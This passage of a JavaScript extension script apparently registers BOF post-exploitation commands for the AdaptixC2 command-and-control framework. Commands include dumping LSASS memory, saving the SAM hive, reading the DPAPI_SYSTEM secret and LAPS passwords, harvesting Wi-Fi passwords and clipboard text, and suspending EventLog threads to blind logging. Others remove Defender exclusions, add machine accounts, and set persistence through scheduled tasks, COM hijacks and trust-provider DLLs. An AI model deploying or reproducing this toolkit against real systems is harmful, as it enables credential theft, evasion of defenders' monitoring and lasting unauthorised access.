    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumdotnet")}"`, "BOF: enumdotnet");
});

var cmd_safeharbor = ax.create_command("bof-safeharbor", "Candidate low-noise injection targets", "bof-safeharbor");
cmd_safeharbor.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "safeharbor")}"`, "BOF: safeharbor");
});

var cmd_listdns = ax.create_command("bof-listdns", "Dump the DNS client resolver cache", "bof-listdns");
cmd_listdns.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listdns")}"`, "BOF: listdns");
});

var cmd_probe = ax.create_command("bof-probe", "Check a single TCP port", "bof-probe 10.0.0.5 445");
cmd_probe.addArgString("host", true, "Hostname or IP");
cmd_probe.addArgString("port", true, "TCP port");
cmd_probe.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["port"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "probe")}" ${params}`, "BOF: probe");
});

var cmd_smbinfo = ax.create_command("bof-smbinfo", "Workstation/SMB info via NetWkstaGetInfo", "bof-smbinfo 192.168.1.10");
cmd_smbinfo.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_smbinfo.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "smbinfo")}" ${params}`, "BOF: smbinfo");
});

var cmd_procdump = ax.create_command("bof-procdump", "MiniDumpWriteDump a process", "bof-procdump 644 C:\\Temp\\lsass.dmp");
cmd_procdump.addArgInt("pid", true, "Target process ID");
cmd_procdump.addArgString("output", "Output file (empty = %TEMP%\\bof_<pid>.dmp)", "");
cmd_procdump.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["output"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "procdump")}" ${params}`, "BOF: procdump");
});

var cmd_regsave = ax.create_command("bof-regsave", "Save a registry hive with backup privilege", "bof-regsave HKLM SAM C:\\Temp\\sam.hive");
cmd_regsave.addArgString("hive", true, "Hive: HKLM, HKCU, HKU");
cmd_regsave.addArgString("path", true, "Key path");
cmd_regsave.addArgString("output", true, "Destination file");
cmd_regsave.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["output"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regsave")}" ${params}`, "BOF: regsave");
});

var cmd_dpapissystem = ax.create_command("bof-dpapissystem", "Read the DPAPI_SYSTEM LSA secret (SYSTEM)", "bof-dpapissystem");
cmd_dpapissystem.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dpapissystem")}"`, "BOF: dpapissystem");
});

var cmd_certdump = ax.create_command("bof-certdump", "List certificates and SHA1 thumbprints", "bof-certdump user");
cmd_certdump.addArgString("store", "user, machine, or empty for both", "");
cmd_certdump.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["store"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "certdump")}" ${params}`, "BOF: certdump");
});

var cmd_clipboard = ax.create_command("bof-clipboard", "Dump current clipboard text", "bof-clipboard");
cmd_clipboard.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "clipboard")}"`, "BOF: clipboard");
});

var cmd_notethief = ax.create_command("bof-notethief", "Recover text from open Notepad windows", "bof-notethief");
cmd_notethief.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "notethief")}"`, "BOF: notethief");
});

var cmd_screenshot = ax.create_command("bof-screenshot", "Capture the desktop to a BMP file", "bof-screenshot C:\\Temp\\screen.bmp");
cmd_screenshot.addArgString("path", "Output file (empty = %TEMP%\\bof_shot.bmp)", "");
cmd_screenshot.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "screenshot")}" ${params}`, "BOF: screenshot");
});

var cmd_enumfiles = ax.create_command("bof-enumfiles", "Recursive file search by pattern and keyword", "bof-enumfiles C:\\Users *.txt password");
cmd_enumfiles.addArgString("root", true, "Root directory");
cmd_enumfiles.addArgString("pattern", true, "Wildcard pattern, e.g. *.txt");
cmd_enumfiles.addArgString("keyword", "Content keyword (empty = any)", "");
cmd_enumfiles.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["root"], parsed_json["pattern"], parsed_json["keyword"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumfiles")}" ${params}`, "BOF: enumfiles");
});

var cmd_blindeventlog = ax.create_command("bof-blindeventlog", "Suspend or resume EventLog service threads", "bof-blindeventlog suspend");
cmd_blindeventlog.addArgString("op", "suspend or resume", "suspend");
cmd_blindeventlog.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["op"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "blindeventlog")}" ${params}`, "BOF: blindeventlog");
});

var cmd_enumexclusions = ax.create_command("bof-enumexclusions", "List Defender exclusions", "bof-enumexclusions paths");
cmd_enumexclusions.addArgString("type", "paths, extensions, processes, or empty for all", "");
cmd_enumexclusions.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["enum", parsed_json["type"], ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "defender")}" ${params}`, "BOF: defender enum");
});

var cmd_delexclusion = ax.create_command("bof-delexclusion", "Remove a Defender exclusion", "bof-delexclusion paths C:\\Temp");
cmd_delexclusion.addArgString("type", true, "paths, extensions or processes");
cmd_delexclusion.addArgString("value", true, "Exclusion value to remove");
cmd_delexclusion.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["del", parsed_json["type"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "defender")}" ${params}`, "BOF: defender del");
});

var cmd_enableefs = ax.create_command("bof-enableefs", "Start the EFS service", "bof-enableefs");
cmd_enableefs.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enableefs")}"`, "BOF: enableefs");
});

var cmd_ldapsearch = ax.create_command("bof-ldapsearch", "Generic LDAP search against the local DC", "bof-ldapsearch (objectClass=user) cn,sAMAccountName");
cmd_ldapsearch.addArgString("filter", true, "LDAP filter");
cmd_ldapsearch.addArgString("attrs", "Comma-separated attributes (empty = all)", "");
cmd_ldapsearch.addArgString("base", "Search base (empty = defaultNamingContext)", "");
cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["filter"], parsed_json["attrs"], parsed_json["base"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ldapsearch")}" ${params}`, "BOF: ldapsearch");
});

var cmd_addmachineaccount = ax.create_command("bof-addmachineaccount", "Add a computer object via LDAP", "bof-addmachineaccount EVILPC01");
cmd_addmachineaccount.addArgString("name", true, "Computer name (without $)");
cmd_addmachineaccount.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addmachineaccount")}" ${params}`, "BOF: addmachineaccount");
});

var cmd_kerberoast = ax.create_command("bof-kerberoast", "List Kerberoastable and AS-REP roastable accounts", "bof-kerberoast all");
cmd_kerberoast.addArgString("mode", "spn, asrep or all", "all");
cmd_kerberoast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "kerberoast")}" ${params}`, "BOF: kerberoast");
});

var cmd_lapsdump = ax.create_command("bof-lapsdump", "Read LAPS passwords from AD", "bof-lapsdump");
cmd_lapsdump.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lapsdump")}"`, "BOF: lapsdump");
});

var cmd_klist = ax.create_command("bof-klist", "List cached Kerberos tickets", "bof-klist");
cmd_klist.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "klist")}"`, "BOF: klist");
});

var cmd_kerbhash = ax.create_command("bof-kerbhash", "Derive RC4/AES Kerberos keys from a password", "bof-kerbhash Password123 alice CORP.LOCAL");
cmd_kerbhash.addArgString("password", true, "Cleartext password");
cmd_kerbhash.addArgString("user", "Username (for AES salt)", "");
cmd_kerbhash.addArgString("realm", "Realm (for AES salt)", "");
cmd_kerbhash.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["password"], parsed_json["user"], parsed_json["realm"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "kerbhash")}" ${params}`, "BOF: kerbhash");
});

function svc_hook(op) {
    return function (id, cmdline, parsed_json) {
        let params = ax.bof_pack("cstr,cstr,cstr", [op, parsed_json["service"], parsed_json["starttype"] || ""]);
        ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svcctl")}" ${params}`, "BOF: svcctl " + op);
    };
}

var cmd_svcconfig = ax.create_command("bof-sc-config", "Change a service start type", "bof-sc-config Spooler disabled");
cmd_svcconfig.addArgString("service", true, "Service name");
cmd_svcconfig.addArgString("starttype", true, "boot, system, auto, demand or disabled");
cmd_svcconfig.setPreHook(svc_hook("config"));

var cmd_svcstart = ax.create_command("bof-sc-start", "Start a service", "bof-sc-start Spooler");
cmd_svcstart.addArgString("service", true, "Service name");
cmd_svcstart.addArgString("starttype", "Unused", "");
cmd_svcstart.setPreHook(svc_hook("start"));

var cmd_svcstop = ax.create_command("bof-sc-stop", "Stop a service", "bof-sc-stop Spooler");
cmd_svcstop.addArgString("service", true, "Service name");
cmd_svcstop.addArgString("starttype", "Unused", "");
cmd_svcstop.setPreHook(svc_hook("stop"));

/* ---- catalog aliases ------------------------------------------------ */

var cmd_netgrouplist = ax.create_command("bof-netgrouplist", "Domain groups (alias of bof-domaingroups)", "bof-netgrouplist CORP");
cmd_netgrouplist.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplist.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaingroups")}" ${params}`, "BOF: domaingroups");
});

var cmd_netgrouplistmembers = ax.create_command("bof-netgrouplistmembers", "Domain group members (alias)", "bof-netgrouplistmembers \"Domain Admins\" CORP");
cmd_netgrouplistmembers.addArgString("group", true, "Group name");
cmd_netgrouplistmembers.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplistmembers.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_netgrouplistmembers2 = ax.create_command("bof-netgrouplistmembers2", "Domain group members (BOFHound alias)", "bof-netgrouplistmembers2 \"Domain Admins\"");
cmd_netgrouplistmembers2.addArgString("group", true, "Group name");
cmd_netgrouplistmembers2.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgrouplistmembers2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_netlocalgrouplist = ax.create_command("bof-netlocalgrouplist", "Local groups (alias of bof-netlocalgroups)", "bof-netlocalgrouplist 192.168.1.10");
cmd_netlocalgrouplist.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgrouplist.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroups")}" ${params}`, "BOF: netlocalgroups");
});

var cmd_netlocalgrouplistmembers = ax.create_command("bof-netlocalgrouplistmembers", "Local group members (alias)", "bof-netlocalgrouplistmembers Administrators");
cmd_netlocalgrouplistmembers.addArgString("group", true, "Local group name");
cmd_netlocalgrouplistmembers.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgrouplistmembers.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroupmembers")}" ${params}`, "BOF: netlocalgroupmembers");
});

var cmd_netuse_add = ax.create_command("bof-netuse_add", "Map a share (alias of bof-netuse)", "bof-netuse_add \\\\10.0.0.5\\C$ CORP\\user pass");
cmd_netuse_add.addArgString("share", true, "UNC path");
cmd_netuse_add.addArgString("user", "Username", "");
cmd_netuse_add.addArgString("password", "Password", "");
cmd_netuse_add.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["share"], parsed_json["user"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse")}" ${params}`, "BOF: netuse");
});

var cmd_portscanbof = ax.create_command("bof-portscanbof", "TCP port scan (alias of bof-portscan)", "bof-portscanbof 10.0.0.5 22,80,443");
cmd_portscanbof.addArgString("host", true, "Hostname or IP");
cmd_portscanbof.addArgString("ports", true, "Ports: 22,80,8000-8100");
cmd_portscanbof.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["ports"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "portscan")}" ${params}`, "BOF: portscan");
});

var cmd_netsession2 = ax.create_command("bof-netsession2", "SMB sessions (BOFHound alias)", "bof-netsession2 192.168.1.10");
cmd_netsession2.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netsession2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netsession")}" ${params}`, "BOF: netsession");
});

var cmd_get_password_policy = ax.create_command("bof-get_password_policy", "Password policy (alias)", "bof-get_password_policy CORP");
cmd_get_password_policy.addArgString("domain", "Domain or host (empty = local)", "");
cmd_get_password_policy.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "passwordpolicy")}" ${params}`, "BOF: passwordpolicy");
});

function hash_hook(algo) {
    return function (id, cmdline, parsed_json) {
        let params = ax.bof_pack("cstr,cstr", [parsed_json["path"], algo]);
        ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hashfile")}" ${params}`, "BOF: hashfile " + algo);
    };
}

var cmd_md5 = ax.create_command("bof-md5", "MD5 a file (alias of bof-hashfile)", "bof-md5 C:\\Windows\\System32\\ntdll.dll");
cmd_md5.addArgString("path", true, "File path");
cmd_md5.setPreHook(hash_hook("md5"));

var cmd_sha1 = ax.create_command("bof-sha1", "SHA1 a file (alias of bof-hashfile)", "bof-sha1 C:\\Windows\\System32\\ntdll.dll");
cmd_sha1.addArgString("path", true, "File path");
cmd_sha1.setPreHook(hash_hook("sha1"));

var cmd_sha256 = ax.create_command("bof-sha256", "SHA256 a file (alias of bof-hashfile)", "bof-sha256 C:\\Windows\\System32\\ntdll.dll");
cmd_sha256.addArgString("path", true, "File path");
cmd_sha256.setPreHook(hash_hook("sha256"));

var cmd_get_priv = ax.create_command("bof-get_priv", "Enable a token privilege (alias)", "bof-get_priv SeDebugPrivilege");
cmd_get_priv.addArgString("privilege", true, "Privilege name");
cmd_get_priv.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["privilege"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tokenpriv")}" ${params}`, "BOF: tokenpriv");
});

var cmd_enumdrives = ax.create_command("bof-enumdrives", "List drives (alias of bof-drives)", "bof-enumdrives");
cmd_enumdrives.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drives")}"`, "BOF: drives");
});

var cmd_enumlib = ax.create_command("bof-enumlib", "List process modules (alias of bof-listmods)", "bof-enumlib 1234");
cmd_enumlib.addArgInt("pid", "Process ID (0 = current)", 0);
cmd_enumlib.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listmods")}" ${params}`, "BOF: listmods");
});

var cmd_dumpwifi = ax.create_command("bof-dumpwifi", "Dump Wi-Fi profiles (alias of bof-wifi)", "bof-dumpwifi");
cmd_dumpwifi.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

var cmd_wifipasswords = ax.create_command("bof-wifipasswords", "Dump Wi-Fi passwords (alias of bof-wifi)", "bof-wifipasswords");
cmd_wifipasswords.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

/* ------------------------------------------------------------------ */
/* Tier 1 native additions                                             */
/* ------------------------------------------------------------------ */

var cmd_cacls = ax.create_command("bof-cacls", "Show owner and DACL for a file or directory", "bof-cacls C:\\Windows\\System32");
cmd_cacls.addArgString("path", true, "File or directory path");
cmd_cacls.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "cacls")}" ${params}`, "BOF: cacls");
});

var cmd_geolocation = ax.create_command("bof-geolocation", "Show region, country and timezone (offline)", "bof-geolocation");
cmd_geolocation.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "geolocation")}"`, "BOF: geolocation");
});

var cmd_evtxsearch = ax.create_command("bof-evtxsearch", "Query an event log channel and render XML", "bof-evtxsearch Security \"*[System[(EventID=4624)]]\" 5");
cmd_evtxsearch.addArgString("channel", true, "Channel, for example Security or System");
cmd_evtxsearch.addArgString("xpath", "XPath filter (empty = all events)", "");
cmd_evtxsearch.addArgString("max", "Maximum events to print", "10");
cmd_evtxsearch.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["channel"], parsed_json["xpath"], parsed_json["max"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "evtxsearch")}" ${params}`, "BOF: evtxsearch");
});

var cmd_finduserhooks = ax.create_command("bof-finduserhooks", "Flag hooked export prologues in user-mode modules", "bof-finduserhooks ntdll.dll");
cmd_finduserhooks.addArgString("module", "Module name (empty = common modules)", "");
cmd_finduserhooks.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["module"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "finduserhooks")}" ${params}`, "BOF: finduserhooks");
});

var cmd_enumhandles = ax.create_command("bof-enumhandles", "Show per-process handle counts", "bof-enumhandles");
cmd_enumhandles.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumhandles")}"`, "BOF: enumhandles");
});

var cmd_processhandles = ax.create_command("bof-processhandles", "List handles held by a process", "bof-processhandles 1234");
cmd_processhandles.addArgInt("pid", true, "Process ID");
cmd_processhandles.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "processhandles")}" ${params}`, "BOF: processhandles");
});

var cmd_killprocess = ax.create_command("bof-killprocess", "Terminate a process by PID", "bof-killprocess 1234");
cmd_killprocess.addArgInt("pid", true, "Process ID");
cmd_killprocess.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "killprocess")}" ${params}`, "BOF: killprocess");
});

var cmd_vssenum = ax.create_command("bof-vssenum", "Enumerate VSS snapshots or providers", "bof-vssenum list");
cmd_vssenum.addArgString("mode", "list or providers", "list");
cmd_vssenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vssenum")}" ${params}`, "BOF: vssenum");
});

var cmd_wfpenum = ax.create_command("bof-wfpenum", "Enumerate WFP filters and sublayers", "bof-wfpenum all");
cmd_wfpenum.addArgString("mode", "filters, sublayers or all", "all");
cmd_wfpenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wfpenum")}" ${params}`, "BOF: wfpenum");
});

var cmd_nbtscan = ax.create_command("bof-nbtscan", "NetBIOS node status scan", "bof-nbtscan 10.0.0.5,10.0.0.6");
cmd_nbtscan.addArgString("hosts", true, "Comma-separated hosts or IPs");
cmd_nbtscan.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["hosts"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nbtscan")}" ${params}`, "BOF: nbtscan");
});

var cmd_adcs_enum = ax.create_command("bof-adcs_enum", "Enumerate ADCS CAs, templates and enrollment services", "bof-adcs_enum all");
cmd_adcs_enum.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

var cmd_ldapsecuritycheck = ax.create_command("bof-ldapsecuritycheck", "Check LDAP signing and channel-binding hardening", "bof-ldapsecuritycheck");
cmd_ldapsecuritycheck.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ldapsecuritycheck")}"`, "BOF: ldapsecuritycheck");
});

var cmd_schtasksenum = ax.create_command("bof-schtasksenum", "Enumerate scheduled tasks (hidden included)", "bof-schtasksenum");
cmd_schtasksenum.addArgString("folder", "Task folder path", "\\");
cmd_schtasksenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["enum", parsed_json["folder"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks enum");
});

var cmd_schtasksquery = ax.create_command("bof-schtasksquery", "Show one scheduled task and its XML", "bof-schtasksquery \\Microsoft\\Windows\\Defrag\\ScheduledDefrag");
cmd_schtasksquery.addArgString("task", true, "Task path");
cmd_schtasksquery.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["query", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks query");
});

var cmd_schtaskscreate = ax.create_command("bof-schtaskscreate", "Create a logon-triggered scheduled task", "bof-schtaskscreate Updater C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_schtaskscreate.addArgString("name", true, "Task name");
cmd_schtaskscreate.addArgString("command", true, "Executable to run");
cmd_schtaskscreate.addArgString("arguments", "Command arguments", "");
cmd_schtaskscreate.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["create", parsed_json["name"], parsed_json["command"], parsed_json["arguments"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks create");
});

var cmd_schtasksdelete = ax.create_command("bof-schtasksdelete", "Delete a scheduled task", "bof-schtasksdelete Updater");
cmd_schtasksdelete.addArgString("task", true, "Task path");
cmd_schtasksdelete.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["delete", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks delete");
});

var cmd_schtasksrun = ax.create_command("bof-schtasksrun", "Run a scheduled task on demand", "bof-schtasksrun Updater");
cmd_schtasksrun.addArgString("task", true, "Task path");
cmd_schtasksrun.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["run", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks run");
});

var cmd_addtaskscheduler = ax.create_command("bof-AddTaskScheduler", "Create a scheduled task (alias of bof-schtaskscreate)", "bof-AddTaskScheduler Updater C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_addtaskscheduler.addArgString("name", true, "Task name");
cmd_addtaskscheduler.addArgString("command", true, "Executable to run");
cmd_addtaskscheduler.addArgString("arguments", "Command arguments", "");
cmd_addtaskscheduler.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["create", parsed_json["name"], parsed_json["command"], parsed_json["arguments"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks create");
});

var cmd_deltaskscheduler = ax.create_command("bof-DelTaskScheduler", "Delete a scheduled task (alias of bof-schtasksdelete)", "bof-DelTaskScheduler Updater");
cmd_deltaskscheduler.addArgString("task", true, "Task path");
cmd_deltaskscheduler.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", ["delete", parsed_json["task"], "", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtasks")}" ${params}`, "BOF: schtasks delete");
});

var cmd_comhunter = ax.create_command("bof-comhunter", "Find hijackable COM registrations or set user-hive overrides", "bof-comhunter find");
cmd_comhunter.addArgString("operation", "find, list, add, remove or treatas", "find");
cmd_comhunter.addArgString("arg1", "CLSID, substring or DLL depending on operation", "");
cmd_comhunter.addArgString("arg2", "DLL, server CLSID or unused", "");
cmd_comhunter.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["operation"], parsed_json["arg1"], parsed_json["arg2"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "comhunter")}" ${params}`, "BOF: comhunter");
});

var cmd_trustme = ax.create_command("bof-trustme", "Manage trust-provider persistence (list/add/remove)", "bof-trustme list");
cmd_trustme.addArgString("operation", "list, add or remove", "list");
cmd_trustme.addArgString("dll", "DLL to register (add)", "");
cmd_trustme.addArgString("function", "Exported entry point (add)", "");
cmd_trustme.addArgString("guid", "Provider GUID (optional for add, required for remove)", "");
cmd_trustme.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["operation"], parsed_json["dll"], parsed_json["function"], parsed_json["guid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "trustme")}" ${params}`, "BOF: trustme");
});

var cmd_addlocalcert = ax.create_command("bof-addlocalcert", "Create a self-signed cert and add it to a MY store", "bof-addlocalcert machine CN=AdaptixBOFKit");
cmd_addlocalcert.addArgString("store", "user or machine", "machine");
cmd_addlocalcert.addArgString("subject", "X500 subject", "CN=AdaptixBOFKit");
cmd_addlocalcert.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["store"], parsed_json["subject"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addlocalcert")}" ${params}`, "BOF: addlocalcert");
});

var cmd_addfirewallrule = ax.create_command("bof-addfirewallrule", "Add, remove or list Windows Firewall rules", "bof-addfirewallrule add AdaptixC2 443 tcp allow");
cmd_addfirewallrule.addArgString("operation", "add, remove or list", "add");
cmd_addfirewallrule.addArgString("name", true, "Rule name");
cmd_addfirewallrule.addArgString("port", "Local port (add)", "");
cmd_addfirewallrule.addArgString("protocol", "tcp, udp or any", "tcp");
cmd_addfirewallrule.addArgString("action", "allow or block", "allow");
cmd_addfirewallrule.addArgString("program", "Optional program path", "");
cmd_addfirewallrule.addArgString("direction", "in or out", "in");
cmd_addfirewallrule.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", [
        parsed_json["operation"], parsed_json["name"], parsed_json["port"],
        parsed_json["protocol"], parsed_json["action"], parsed_json["program"],
        parsed_json["direction"]
    ]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "addfirewallrule")}" ${params}`, "BOF: addfirewallrule");
});

var cmd_lnkgenerator = ax.create_command("bof-lnkgenerator", "Create a Windows shortcut (.lnk)", "bof-lnkgenerator C:\\Users\\Public\\Update.lnk C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_lnkgenerator.addArgString("lnk", true, "Output .lnk path");
cmd_lnkgenerator.addArgString("target", true, "Shortcut target");
cmd_lnkgenerator.addArgString("arguments", "Target arguments", "");
cmd_lnkgenerator.addArgString("workdir", "Working directory", "");
